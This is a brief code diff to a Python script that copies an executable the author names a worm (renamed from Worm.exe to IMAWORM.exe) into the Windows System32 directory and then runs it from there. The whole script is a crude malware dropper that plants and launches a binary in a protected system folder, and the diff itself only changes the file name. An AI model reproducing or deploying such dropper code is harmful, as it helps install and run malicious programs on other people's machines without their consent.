@@ -1,6 +1,6 @@
 import os
 import shutil
 cwd = os.getcwd()
-shutil.copy(cwd+"/Worm.exe", "/Windows/System32")
+shutil.copy(cwd+"/IMAWORM.exe", "/Windows/System32")
 os.chdir("/Windows/System32")
-os.system(".\Worm.exe")
+os.system(".\IMAWORM.exe")
